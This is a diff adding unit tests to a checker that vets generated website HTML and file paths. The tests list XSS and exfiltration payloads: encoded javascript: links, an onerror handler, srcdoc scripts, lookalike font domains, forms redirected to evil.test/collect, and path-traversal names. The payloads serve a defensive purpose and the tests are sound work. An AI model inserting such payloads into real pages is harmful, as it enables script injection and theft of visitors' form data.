@@ -68,3 +68,26 @@ test("only the request's own site folder may change", () => {
   assert.deepEqual(checkPaths(["sites/joe/index.html", "sites/joe/img/t1-1.jpg"], "joe"), []);
   assert.equal(checkPaths(["sites/other/index.html", "AGENTS.md", ".github/workflows/agent.yml"], "joe").length, 3);
 });
+
+test("browser-decoded URL and attribute bypasses are rejected", () => {
+  for (const injection of [
+    '<a href="jav&#x61;script:alert(1)">x</a>', '<a href="java&#9;script:alert(1)">x</a>',
+    '<iframe src=https://evil.test></iframe>', '<iframe src="https://www.google.com/maps/embed-evil"></iframe>',
+    '<iframe src="https://www.google.com/maps/embed/../../search"></iframe>',
+    '<iframe src="https://www.google.com/maps/embed" srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
+    '<button form="quote" formaction=https://evil.test/collect>Send</button>',
+    '<input type=submit form="quote" formaction=https://evil.test/collect>',
+    '<link rel=stylesheet href=https://evil.test/a.css>',
+    '<link rel=stylesheet href=https://fonts.googleapis.com.evil.test/css>',
+    '<svg><a xlink:href="&#106;avascript:alert(1)">x</a></svg>',
+    '<template><img src=x ONERROR=alert(1)></template>',
+  ]) assert.ok(checkHtml(good.replace('</body>', `${injection}</body>`), { formAction }).length, injection);
+});
+
+test("ordinary links, decoded approved action, fonts and maps remain valid", () => {
+ const html = good.replace(formAction, formAction.replace('joe', 'jo&#101;')).replace('</body>', '<a href="/blog/">Blog</a><a href="tel:+15555555555">Call</a><a href="https://booking.example.test">Book with provider</a><iframe src=https://www.google.com/maps/embed?pb=1></iframe><link rel=stylesheet href=https://fonts.googleapis.com/css2?family=Inter></body>');
+ assert.deepEqual(checkHtml(html, {formAction}), []);
+ assert.equal(checkPaths(['sites/joe/../other/index.html', 'sites/joe/../../agent/run.mjs'], 'joe').length, 2);
+});
+
+test("foreign frameset document is rejected", () => assert.ok(checkHtml('<html><head><title>Site</title></head><frameset><frame src=https://evil.test><noframes>Site by <a href="https://frontstepsites.com">Front Step Sites</a></noframes></frameset></html>', {formAction}).length));
